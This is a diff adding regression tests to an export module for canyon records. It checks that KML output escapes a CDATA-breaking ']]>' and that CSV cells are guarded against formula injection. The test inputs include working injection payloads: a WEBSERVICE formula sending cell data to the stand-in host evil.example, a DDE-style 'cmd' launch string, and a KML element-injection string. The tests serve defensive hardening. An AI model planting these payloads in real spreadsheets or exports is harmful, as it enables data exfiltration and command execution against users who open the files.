@@ -70,6 +70,34 @@ describe("buildCanyonExport — KML", () => {
     expect(xml).toContain("<coordinates>150.3,-33.5,0</coordinates>");
     expect(blob.type).toBe("application/vnd.google-earth.kml+xml");
   });
+
+  // FECO-009: a `]]>` inside notes must not terminate the CDATA section early
+  // — otherwise the rest of the description is parsed as XML markup, letting
+  // a shared canyon's owner-authored notes inject elements into the file a
+  // sharee exports and opens elsewhere.
+  it("escapes a ]]> inside notes instead of letting it close the CDATA section early (FECO-009)", async () => {
+    const malicious = canyon({
+      notes: 'Approach via the north gully]]></description><Placemark><name>INJECTED',
+    });
+    const { blob } = buildCanyonExport([malicious], "kml");
+    const xml = await text(blob);
+
+    // The raw terminator must never appear mid-content — every "]]>" in the
+    // output is the CDATA-splitting escape or the section's real end.
+    expect(xml).not.toMatch(/gully\]\]>/);
+    expect(xml).toContain("gully]]]]><![CDATA[>");
+
+    // Parse it for real and confirm no injected sibling element was created —
+    // exactly one Placemark, and the notes text survives intact inside it.
+    const doc = new DOMParser().parseFromString(xml, "application/xml");
+    expect(doc.getElementsByTagName("parsererror")).toHaveLength(0);
+    const placemarks = doc.getElementsByTagName("Placemark");
+    expect(placemarks).toHaveLength(1);
+    const description = placemarks[0].getElementsByTagName("description")[0];
+    expect(description.textContent).toContain(
+      "Approach via the north gully]]></description><Placemark><name>INJECTED",
+    );
+  });
 });
 
 // A canyon record carrying every internal field the API can attach — these
@@ -305,5 +333,53 @@ describe("buildCanyonExport — CSV (EXPORT-1)", () => {
     // A canyon lacking a field gets an empty cell for that column.
     expect(r2["attr:rockType"]).toBe("granite");
     expect(r2["attr:firstDescentYear"]).toBe("");
+  });
+
+  // FECO-010: a cell beginning with =, +, -, @ opens as a live formula in
+  // Excel/LibreOffice/Sheets. A shared canyon's owner-authored name/notes/
+  // custom-field value is attacker-reachable text that survives export
+  // unmodified without this guard.
+  describe("formula-injection guard (FECO-010)", () => {
+    it("prefixes a name/notes cell starting with = with a neutralizing apostrophe", async () => {
+      const malicious = canyon({
+        name: '=WEBSERVICE("https://evil.example/?d="&A1)',
+        notes: "+SUM(1,2)",
+      });
+      const { blob } = buildCanyonExport([malicious], "csv");
+      const { rows } = await parseCsv(csvFile(await text(blob)));
+      expect(rows[0].name).toBe('\'=WEBSERVICE("https://evil.example/?d="&A1)');
+      expect(rows[0].notes).toBe("'+SUM(1,2)");
+    });
+
+    it("prefixes a custom-field value starting with @ or - with a neutralizing apostrophe", async () => {
+      const malicious = canyon({
+        attributes: { customFields: { danger: "@SUM(1,2)", warning: "-2+3+cmd|' /C calc'!A1" } },
+      });
+      const { blob } = buildCanyonExport([malicious], "csv");
+      const { rows } = await parseCsv(csvFile(await text(blob)));
+      expect(rows[0]["attr:danger"]).toBe("'@SUM(1,2)");
+      expect(rows[0]["attr:warning"]).toBe("'-2+3+cmd|' /C calc'!A1");
+    });
+
+    it("does NOT prefix latitude/longitude — a negative coordinate is a plain number, not a formula", async () => {
+      const southernWestern = canyon({ latitude: -33.5, longitude: -70.2 });
+      const { blob } = buildCanyonExport([southernWestern], "csv");
+      const raw = await text(blob);
+      // The neutralizing apostrophe must never reach the coordinate cells —
+      // it would corrupt the app's own round-trip via parseLatLng.
+      expect(raw).not.toContain("'-33.5");
+      expect(raw).not.toContain("'-70.2");
+      const { rows } = await parseCsv(csvFile(raw));
+      expect(parseLatLng(rows[0].latitude)).toEqual({ ok: true, value: -33.5 });
+      expect(parseLatLng(rows[0].longitude)).toEqual({ ok: true, value: -70.2 });
+    });
+
+    it("leaves an ordinary name/notes cell untouched", async () => {
+      const plain = canyon({ name: "Empress Canyon", notes: "Nice canyon" });
+      const { blob } = buildCanyonExport([plain], "csv");
+      const { rows } = await parseCsv(csvFile(await text(blob)));
+      expect(rows[0].name).toBe("Empress Canyon");
+      expect(rows[0].notes).toBe("Nice canyon");
+    });
   });
 });
